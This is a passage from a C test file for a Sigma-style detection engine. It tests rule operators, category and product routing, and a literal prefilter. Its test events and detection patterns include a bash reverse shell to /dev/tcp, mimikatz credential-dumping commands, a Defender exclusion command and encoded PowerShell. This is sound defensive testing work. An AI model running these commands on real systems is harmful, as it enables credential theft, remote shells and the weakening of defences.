        tb_pred_num(t, "destination.port", SIGMA_OP_LT, 1024, 0);
        tb_rule(t, 901, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
    }

    /* R902: |lte (numeric less-or-equal; boundary case at the threshold). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_num(t, "destination.port", SIGMA_OP_LTE, 443, 0);
        tb_rule(t, 902, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
    }

    /* R903: case-SENSITIVE equality (SIGMA_PF_CASE) — the flag ships but the
     * case-sensitive compare branch had no test.  "MiMiKatz" must match only the
     * exact case, not "mimikatz". */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.name", SIGMA_OP_EQ, "MiMiKatz", 0, SIGMA_PF_CASE);
        tb_rule(t, 903, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }

    /* R904: per-predicate NEGATE on a value op (Sigma field|...|not idiom).
     * process.name|not "cmd.exe" fires when the field is present and different. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.name", SIGMA_OP_EXISTS, NULL, 0, 0);
        tb_pred_str(t, "process.name", SIGMA_OP_EQ, "cmd.exe", 1, SIGMA_PF_NEGATE);
        tb_rule(t, 904, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R905: field:null idiom = |exists negated.  Fires on logon with NO user.name
     * (absent or empty), never when user.name is present and non-empty. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "logon", 0, 0);
        tb_pred_str(t, "user.name", SIGMA_OP_EXISTS, NULL, 1, SIGMA_PF_NEGATE);
        tb_rule(t, 905, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R906: condition OR (SIGMA_C_OR = Sigma "1 of them") — the token ships but
     * no test emitted it.  Two selections OR'd: fires if EITHER matches. */
    {
        uint32_t psA = t->db.n_preds;
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "alpha", 0, 0);
        uint32_t sA = tb_sel(t, psA);
        uint32_t psB = t->db.n_preds;
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "bravo", 0, 0);
        uint32_t sB = tb_sel(t, psB);
        uint32_t c0 = t->db.n_cond;
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_SEL, {0, 0, 0}, 0};
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_SEL, {0, 0, 0}, 1};
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_OR, {0, 0, 0}, 0};
        tb_rule(t, 906, sA, (sB - sA) + 1, c0, t->db.n_cond - c0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R907: multi-selection implicit AND (cond_count==0 with sel_count>1 = Sigma
     * "all of them") — only ever tested with a single selection before.  Two
     * selections, no explicit condition: the matcher ANDs them. */
    {
        uint32_t psA = t->db.n_preds;
        tb_pred_str(t, "event.module", SIGMA_OP_EQ, "sysmon", 0, 0);
        uint32_t sA = tb_sel(t, psA);
        uint32_t psB = t->db.n_preds;
        tb_pred_str(t, "event.type", SIGMA_OP_EQ, "start", 0, 0);
        tb_sel(t, psB);
        tb_rule(t, 907, sA, 2, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R908: case-SENSITIVE regex (Sigma |re default) via SIGMA_PF_CASE on an RE
     * predicate. Proves the runtime clears PCRE2_CASELESS when PF_CASE is set. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "Invoke-[A-Z][a-z]+", 0, SIGMA_PF_CASE);
        tb_rule(t, 908, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }

    /* R909: |fieldref equality — user.name equals the value of user.target_name. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_fieldref(t, "user.name", SIGMA_OP_EQ, "user.target_name", 0, 0);
        tb_rule(t, 909, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R910: |fieldref|contains — command_line contains the value of process.name
     * (proves the fieldref flag composes with the string ops, not just EQ). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_fieldref(t, "process.command_line", SIGMA_OP_CONTAINS, "process.name", 0, 0);
        tb_rule(t, 910, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }
}

/* ===========================================================================
 * logsource/category bucket index.  Builds a small bucketed db,
 * serializes -> loads (so the loader resolves av_bucket + cat_field_id), and
 * asserts (a) the bucketed matcher == the full linear scan for every event,
 * (b) category narrowing actually prunes (a web rule never fires on a dns
 * event whose fields happen to overlap), (c) the wrong-version rejection path.
 * ========================================================================= */
static bool hitset_eq(sigma_eval_t* ev, const event_t* e) {
    sigma_hit_t hb[32], hl[32];
    int nb = sigma_eval_run(ev, ev_lookup, (void*)e, hb, 32);
    int nl = sigma_eval_run_linear(ev, ev_lookup, (void*)e, hl, 32);
    if (nb != nl) return false;
    /* match-order is rule-table order in both paths only for the linear scan;
     * compare as sets. */
    for (int i = 0; i < nb; i++) {
        bool found = false;
        for (int j = 0; j < nl; j++)
            if (hb[i].rule_id == hl[j].rule_id) {
                found = true;
                break;
            }
        if (!found) return false;
    }
    return true;
}

static void test_buckets(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    /* idx 0 (web): url.path|contains "/admin"  -> rule 10 */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "url.path", SIGMA_OP_CONTAINS, "/admin", 0, 0);
        tb_rule(t, 10, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }
    /* idx 1 (dns): dns.question.name|endswith ".evil.tld" -> rule 20 */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "dns.question.name", SIGMA_OP_ENDSWITH, ".evil.tld", 0, 0);
        tb_rule(t, 20, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }
    /* idx 2 (always-verify): user.name == "root" -> rule 30 (category-agnostic) */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "user.name", SIGMA_OP_EQ, "root", 0, 0);
        tb_rule(t, 30, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
    }
    /* event.category must be a compiled field so the loader memoizes it. */
    (void)tb_field(t, "event.category");

    uint32_t web[] = {0}, dns[] = {1}, av[] = {2};
    tb_bucket(t, "web", web, 1);
    tb_bucket(t, "dns", dns, 1);
    tb_bucket(t, "", av, 1); /* always-verify */

    sigma_db_t db = tb_finish(t);
    /* Round-trip through the artifact so av_bucket + cat_field_id are resolved. */
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "bucket: serialize ok");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "bucket: load ok");
    CHECK(d.n_buckets == 3, "bucket: 3 buckets");
    CHECK(d.av_bucket != UINT32_MAX, "bucket: always-verify resolved");
    CHECK(d.cat_field_id != UINT32_MAX, "bucket: event.category field memoized");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);

    /* web event hitting the web rule + the always-verify rule (user root). */
    {
        kv_t kv[] = {{"event.category", "web"}, {"url.path", "/admin/x"}, {"user.name", "root"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 10, NULL), "bucket: web rule fires on web event");
        CHECK(fires(ev, &e, 30, NULL), "bucket: always-verify fires on web event");
        CHECK(!fires(ev, &e, 20, NULL), "bucket: dns rule pruned on web event");
        CHECK(hitset_eq(ev, &e), "bucket==linear: web event");
    }

    /* dns event: only the dns rule (+ no root). web rule must be pruned even
     * though we deliberately feed a url.path the web rule WOULD match, a dns
     * event never carries url.path in production, so this is the unsound-prune
     * guard: bucketing scopes by category, and that matches linear here because
     * the linear scan also won't fire the web rule (url.path present? then they
     * MUST agree). Use a category-clean dns event for the equality assertion. */
    {
        kv_t kv[] = {{"event.category", "dns"}, {"dns.question.name", "x.evil.tld"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 20, NULL), "bucket: dns rule fires on dns event");
        CHECK(!fires(ev, &e, 10, NULL), "bucket: web rule pruned on dns event");
        CHECK(hitset_eq(ev, &e), "bucket==linear: dns event");
    }

    /* unknown category -> always-verify only. */
    {
        kv_t kv[] = {{"event.category", "session"}, {"user.name", "root"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 30, NULL), "bucket: av fires on unknown category");
        CHECK(hitset_eq(ev, &e), "bucket==linear: unknown category");
    }

    /* NO event.category -> soundness full scan (every bucket considered). */
    {
        kv_t kv[] = {{"url.path", "/admin/x"}, {"user.name", "root"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 10, NULL), "bucket: no-category full scan hits web rule");
        CHECK(fires(ev, &e, 30, NULL), "bucket: no-category full scan hits av rule");
        CHECK(hitset_eq(ev, &e), "bucket==linear: no category (full scan)");
    }

    sigma_eval_free(ev);
    sigma_db_free(&d); /* frees copy */
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* Product/service route: no event.category, observer.product names a bucket.
 * Must NOT fall through to the full scan (that would evaluate the web rule). */
static void test_product_route(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "url.path", SIGMA_OP_CONTAINS, "/admin", 0, 0);
        tb_rule(t, 10, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "cisco.aaa.user", SIGMA_OP_EQ, "admin", 0, 0);
        tb_rule(t, 40, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }
    (void)tb_field(t, "event.category");
    uint32_t web[] = {0}, cisco[] = {1};
    tb_bucket(t, "web", web, 1);
    tb_bucket(t, "cisco", cisco, 1);

    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "product-route: serialize");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "product-route: load");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    {
        kv_t kv[] = {{"observer.product", "cisco"}, {"cisco.aaa.user", "admin"}, {"url.path", "/admin/x"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 40, NULL), "product-route: cisco rule fires");
        CHECK(!fires(ev, &e, 10, NULL), "product-route: web rule pruned");
    }
    {
        kv_t kv[] = {{"log.syslog.appname", "cisco"}, {"cisco.aaa.user", "admin"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 40, NULL), "product-route: appname cisco fires");
        CHECK(!fires(ev, &e, 10, NULL), "product-route: appname prunes web");
    }
    {
        kv_t kv[] = {{"event.provider", "cisco"}, {"cisco.aaa.user", "admin"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 40, NULL), "product-route: provider cisco fires");
        CHECK(!fires(ev, &e, 10, NULL), "product-route: provider prunes web");
    }
    sigma_eval_free(ev);
    sigma_db_free(&d);
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* Union of matching buckets: category AND techno/product, not first-wins.
 * A linux keyword rule is in the "linux" bucket; a Windows process event
 * without techno=linux must not run it. */
static void test_route_union(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "mimikatz", 0, 0);
        tb_rule(t, 1, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 4, 50);
    }
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "event.original", SIGMA_OP_CONTAINS, "/dev/tcp/", 0, 0);
        tb_rule(t, 2, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }
    (void)tb_field(t, "event.category");
    (void)tb_field(t, "techno");
    (void)tb_field(t, "technology");
    (void)tb_field(t, "product");
    uint32_t proc[] = {0}, lnx[] = {1};
    tb_bucket(t, "process", proc, 1);
    tb_bucket(t, "linux", lnx, 1);

    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "union: serialize");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "union: load");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.command_line", "mimikatz.exe"},
                     {"event.original", "mimikatz.exe /dev/tcp/1.2.3.4/443"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 1, NULL), "union: process rule fires");
        CHECK(!fires(ev, &e, 2, NULL), "union: linux keyword skipped without techno=linux");
    }
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"techno", "linux"},
                     {"process.command_line", "mimikatz.exe"},
                     {"event.original", "bash -i >& /dev/tcp/1.2.3.4/443"}};
        event_t e = {kv, 4};
        CHECK(fires(ev, &e, 1, NULL), "union: process + linux both fire (process)");
        CHECK(fires(ev, &e, 2, NULL), "union: process + linux both fire (keyword)");
    }
    {
        kv_t kv[] = {{"techno", "linux"}, {"event.original", "cat </dev/tcp/10.0.0.1/22"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 1, NULL), "union: linux-only skips process rule");
        CHECK(fires(ev, &e, 2, NULL), "union: linux-only keyword fires");
    }
    {
        kv_t kv[] = {{"technology", "linux"}, {"event.original", "cat </dev/tcp/10.0.0.1/22"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 2, NULL), "union: leftover technology= alias still routes");
    }
    {
        kv_t kv[] = {{"product", "sshd"}, {"event.original", "unused"}, {"process.command_line", "mimikatz.exe"}};
        event_t e = {kv, 3};
        CHECK(!fires(ev, &e, 1, NULL), "union: unknown product token -> no process bucket");
        CHECK(!fires(ev, &e, 2, NULL), "union: unknown product token -> no linux bucket");
    }
    sigma_eval_free(ev);
    sigma_db_free(&d);
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* Parser stamp: $!techno + $!product. A Sigma rule whose
 * logsource.product is that product token lives in that bucket.
 * event.category alone must not pull a product-scoped rule. */
static void test_route_parser_stamp(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "url.path", SIGMA_OP_CONTAINS, "/admin", 0, 0);
        tb_rule(t, 10, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "user.name", SIGMA_OP_EQ, "root", 0, 0);
        tb_rule(t, 20, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }
    (void)tb_field(t, "event.category");
    (void)tb_field(t, "techno");
    (void)tb_field(t, "product");
    uint32_t ngx[] = {0}, auth[] = {1};
    tb_bucket(t, "nginx", ngx, 1);
    tb_bucket(t, "auth", auth, 1);

    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "stamp: serialize");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "stamp: load");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    {
        kv_t kv[] = {{"techno", "web"},
                     {"product", "nginx"},
                     {"event.category", "web"},
                     {"url.path", "/admin/x"},
                     {"user.name", "root"}};
        event_t e = {kv, 5};
        CHECK(fires(ev, &e, 10, NULL), "stamp: nginx product fires nginx rule");
        CHECK(!fires(ev, &e, 20, NULL), "stamp: nginx does not pull auth rule");
    }
    {
        kv_t kv[] = {{"techno", "unix"},
                     {"product", "auth"},
                     {"event.category", "authentication"},
                     {"url.path", "/admin/x"},
                     {"user.name", "root"}};
        event_t e = {kv, 5};
        CHECK(!fires(ev, &e, 10, NULL), "stamp: auth does not pull nginx rule");
        CHECK(fires(ev, &e, 20, NULL), "stamp: auth product fires auth rule");
    }
    {
        kv_t kv[] = {{"event.category", "web"}, {"url.path", "/admin/x"}, {"user.name", "root"}};
        event_t e = {kv, 3};
        CHECK(!fires(ev, &e, 10, NULL), "stamp: category=web without product=nginx skips nginx rule");
        CHECK(!fires(ev, &e, 20, NULL), "stamp: category=web does not hit auth");
    }
    sigma_eval_free(ev);
    sigma_db_free(&d);
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* ===========================================================================
 * SIMD literal prefilter.  Builds a bucket (here "process") with a
 * mix of rule classes, attaches a litidx, round-trips through the artifact (so
 * the loader builds the Teddy matcher in sigma_db_finalize), and asserts:
 *  (a) prefiltered hit-set == full linear-scan hit-set for EVERY event
 *      (the soundness gate, a wrongly-pruned rule is a missed detection);
 *  (b) a rule with a required literal fires only when the literal is present;
 *  (c) a |re / negated / no-atom rule is ALWAYS verified (it is in
 *      the always-verify set and fires even though it has no litidx needle);
 *      numeric/CIDR rules are field-witnessed and leave always-verify;
 *  (d) a case-MISMATCHED occurrence of the literal still selects the candidate
 *      (case-folded LUT + ci confirm);
 *  (e) an event MISSING the literal prunes the rule (it does not fire and is not
 *      a candidate), verified transitively by the hit-set equality.
 * ========================================================================= */
static void test_prefilter(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);

    /* idx 0: command_line|contains "mimikatz" -> rule 1001 (prefilterable). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "mimikatz", 0, 0);
        tb_rule(t, 1001, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 4, 50);
    }
    /* idx 1: command_line|contains "Invoke-Mimikatz" -> rule 1002 (distinct literal). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "rundll32.exe", 0, 0);
        tb_rule(t, 1002, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }
    /* idx 2: command_line|re "Add-MpPreference" -> rule 1003 (NO sound literal =>
     * always-verify; must NEVER be prefiltered out). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "[Aa]dd-MpPreference", 0, 0);
        tb_rule(t, 1003, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }
    /* idx 3: destination.port|gt 1024 -> rule 1004 (numeric field witness,
     * not always-verify). */
    uint16_t f_port;
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_num(t, "destination.port", SIGMA_OP_GT, 1024, 0);
        f_port = t->preds[ps].field_id;
        tb_rule(t, 1004, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
    }
    /* idx 4: command_line|re "powershell.*-enc" -> rule 1005.  The
     * compiler extracts the SOUND anchor "powershell" (a literal every match must
     * contain) and posts it as a litidx NEEDLE, this rule is NOT always-verify.
     * The C verify still runs regexec, so "anchor present but regex no-match" must
     * yield NO fire (and pf==linear), and "regex match" must fire. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "powershell.*-enc", 0, 0);
        tb_rule(t, 1005, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 4, 50);
    }
    (void)tb_field(t, "event.category");

    uint32_t proc[] = {0, 1, 2, 3, 4};
    tb_bucket(t, "process", proc, 5);
    tb_bucket(t, "", NULL, 0); /* empty always-verify category bucket */

    /* litidx: needles for the two literal rules AND the regex-anchored rule 1005
     * (anchor "powershell"); the bare-RE rule stays always-verify; the numeric
     * rule is posted as a field witness. */
    uint32_t p0[] = {0}, p1[] = {1}, p4[] = {4}, av[] = {2};
    tb_litndl(t, "mimikatz", p0, 1);
    tb_litndl(t, "rundll32.exe", p1, 1);
    tb_litndl(t, "powershell", p4, 1); /* regex anchor needle */
    tb_litav(t, av, 1);
    tb_fwit(t, 3, f_port, 0, SIGMA_OP_GT, 1024);

    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "pf: serialize ok (v5)");
    /* The serialized artifact must declare the current format version. */
    {
        uint32_t ver;
        memcpy(&ver, buf + 4, 4);
        CHECK(ver == SIGMA_FORMAT_VERSION, "pf: artifact is v5");
    }
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "pf: load ok");
    CHECK(d.n_litndl == 3, "pf: 3 prefilter needles");
    CHECK(d.n_litav == 1, "pf: 1 always-verify rule (bare RE)");
    CHECK(d.n_fwit == 1, "pf: 1 numeric field witness");
    CHECK(d.teddy != NULL, "pf: Teddy matcher built at load");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    /* FORCE the prefilter (mode 2): this synthetic bucket is below the
     * production size gate, but we want every assertion below to exercise the
     * Teddy candidate path, not the unconditional bucket scan. */
    sigma_eval_set_prefilter(ev, 2);

    /* (b) literal present -> the prefilterable rule fires; numeric fwit also
     * fires when its own predicate holds (no teddy needle required). */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.command_line", "c:\\x\\mimikatz.exe sekurlsa::logonpasswords"},
                     {"destination.port", "4444"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 1001, NULL), "pf: literal present -> rule fires");
        CHECK(!fires(ev, &e, 1002, NULL), "pf: other literal absent -> pruned");
        CHECK(fires(ev, &e, 1004, NULL), "pf: numeric fwit fires (port>1024)");
        CHECK(hitset_eq(ev, &e), "pf==linear: mimikatz event");
    }

    /* (d) case-MISMATCH still selects the candidate (folded LUT + ci confirm). */
    {
        kv_t kv[] = {{"event.category", "process"}, {"process.command_line", "RUNDLL32.EXE shell32,Control_RunDLL"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 1002, NULL), "pf: case-mismatched literal still selects+fires");
        CHECK(hitset_eq(ev, &e), "pf==linear: case-mismatch event");
    }

    /* (c) always-verify RE rule fires even though it carries no litidx needle and
     * the command line contains NONE of the prefilter needles. */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.command_line", "powershell Add-MpPreference -ExclusionPath c:\\"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 1003, NULL), "pf: always-verify RE rule fires (never gated out)");
        CHECK(!fires(ev, &e, 1001, NULL), "pf: literal rule pruned (needle absent)");
        CHECK(hitset_eq(ev, &e), "pf==linear: always-verify event");
    }

    /* (e) literal absent -> the literal rules are pruned (neither fires); the
     * numeric fwit fires only when its predicate holds. */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.command_line", "notepad.exe readme.txt"},
                     {"destination.port", "80"}};
        event_t e = {kv, 3};
        CHECK(!fires(ev, &e, 1001, NULL), "pf: no needle -> 1001 pruned");
        CHECK(!fires(ev, &e, 1002, NULL), "pf: no needle -> 1002 pruned");
        CHECK(!fires(ev, &e, 1004, NULL), "pf: port 80 -> numeric fwit does not fire");
        CHECK(hitset_eq(ev, &e), "pf==linear: benign event (all pruned)");
    }
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.command_line", "notepad.exe readme.txt"},
                     {"destination.port", "4444"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 1004, NULL), "pf: numeric fwit fires with no teddy needle");
        CHECK(!fires(ev, &e, 1001, NULL), "pf: no needle -> 1001 still pruned");
        CHECK(hitset_eq(ev, &e), "pf==linear: numeric-only event");
    }

    /* ---- SOUND regex-ANCHOR soundness (rule 1005) ---------- */

    /* (f) regex MATCHES: the anchor "powershell" is present -> rule 1005 is a
     * candidate -> regexec confirms -> it FIRES.  This is the load-bearing case:
     * a regex rule that moved OUT of always-verify still fires on a real match. */
    {
        kv_t kv[] = {{"event.category", "process"}, {"process.command_line", "powershell -enc SQBFAFgA"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 1005, NULL), "pf: anchored regex fires on real match (powershell..-enc)");
        CHECK(hitset_eq(ev, &e), "pf==linear: anchored-regex match event");
    }

    /* (g) anchor PRESENT but regex does NOT match: "powershell" is in the text so
     * the rule is a candidate, but regexec rejects (no "-enc" follows) -> NO fire.
     * Proves the anchor only gates CANDIDACY; the verify is still authoritative. */
    {
        kv_t kv[] = {{"event.category", "process"}, {"process.command_line", "powershell -File benign.ps1"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 1005, NULL), "pf: anchor present but regex no-match -> does NOT fire");
        CHECK(hitset_eq(ev, &e), "pf==linear: anchor-present-regex-nomatch event");
    }

    /* (h) anchor ABSENT: "powershell" not in the text -> rule 1005 is correctly
     * pruned (sound: the regex provably cannot match without its required literal).
     * pf==linear here is the MISSED-DETECTION guard for the anchor itself. */
    {
        kv_t kv[] = {{"event.category", "process"}, {"process.command_line", "cmd.exe -enc whatever"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 1005, NULL), "pf: anchor absent -> anchored regex pruned (sound)");
        CHECK(hitset_eq(ev, &e), "pf==linear: anchor-absent event");
    }

    /* (i) case-MISMATCHED anchor ("PowerShell") still selects the candidate via the
     * folded LUT; regexec (ci pattern) then confirms -> fires.  pf==linear. */
    {
        kv_t kv[] = {{"event.category", "process"}, {"process.command_line", "PowerShell -ENC ZQBj"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 1005, NULL), "pf: case-mismatched anchor still selects+fires");
        CHECK(hitset_eq(ev, &e), "pf==linear: case-mismatch anchor event");
    }

    sigma_eval_free(ev);
    sigma_db_free(&d);
    free(buf);
    sigma_db_free(&db);
    free(t);
}

/* Field-scoped conjunctive witnesses: a needle in the wrong field does not
 * complete a clause, and a two-clause AND is not a candidate until BOTH fields
 * carry their literal.  Soundness is still pf==linear; the extra assertions
 * pin the candidate restriction the v4 postings were added for. */
static void test_prefilter_cnf(void) {
    tb_t* t = calloc(1, sizeof(*t));
    assert(t);

    uint16_t f_img = tb_field(t, "process.executable");
    uint16_t f_cmd = tb_field(t, "process.command_line");
    (void)tb_field(t, "event.category");

    /* rule 2001: Image contains psexec.exe AND CommandLine contains mimikatz */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.executable", SIGMA_OP_CONTAINS, "psexec.exe", 0, 0);
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "mimikatz", 1, 0);
        tb_rule(t, 2001, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 4, 50);
    }
    /* rule 2002: CommandLine contains whoami (single field-scoped clause) */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "whoami", 0, 0);
        tb_rule(t, 2002, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    uint32_t proc[] = {0, 1};
    tb_bucket(t, "process", proc, 2);
    tb_bucket(t, "", NULL, 0);

    sigma_litref_t r_psexec[] = {{0, f_img, 0, 0}};
    sigma_litref_t r_mimikatz[] = {{0, f_cmd, 1, 0}};
    sigma_litref_t r_whoami[] = {{1, f_cmd, 0, 0}};
    tb_litrefs(t, "psexec.exe", r_psexec, 1);
    tb_litrefs(t, "mimikatz", r_mimikatz, 1);
    tb_litrefs(t, "whoami", r_whoami, 1);

    sigma_db_t db = tb_finish(t);
    uint8_t* buf = NULL;
    size_t len = 0;
    CHECK(sigma_db_serialize(&db, &buf, &len) == SIGMA_OK, "cnf: serialize ok");
    uint8_t* copy = malloc(len);
    assert(copy);
    memcpy(copy, buf, len);
    sigma_db_t d;
    memset(&d, 0, sizeof(d));
    CHECK(sigma_db_load_buffer(copy, len, &d) == SIGMA_OK, "cnf: load ok");
    CHECK(d.field_teddy != NULL, "cnf: per-field Teddy built (scoped postings)");
    CHECK(d.rule_clauses && d.rule_clauses[0] == 2, "cnf: rule 0 has 2 witness clauses");
    CHECK(d.rule_clauses[1] == 1, "cnf: rule 1 has 1 witness clause");
    CHECK(d.lit_any_field == 0, "cnf: all postings are field-scoped");

    sigma_eval_t* ev = sigma_eval_create(&d);
    assert(ev);
    sigma_eval_set_prefilter(ev, 2);

    /* Both fields carry their own literal -> AND fires. */
    {
        kv_t kv[] = {{"event.category", "process"},
                     {"process.executable", "C:\\Windows\\PsExec.exe"},
                     {"process.command_line", "psexec.exe -s mimikatz.exe"}};
        event_t e = {kv, 3};
        CHECK(fires(ev, &e, 2001, NULL), "cnf: both clauses in the named fields -> fire");
        CHECK(hitset_eq(ev, &e), "cnf==linear: both-fields event");
    }

    /* Both needles present, but each in the OTHER field: Image has mimikatz,
     * CommandLine has psexec.  Linear does not fire.  An unscoped prefilter
     * would still make this a candidate; the field-scoped one must not, and
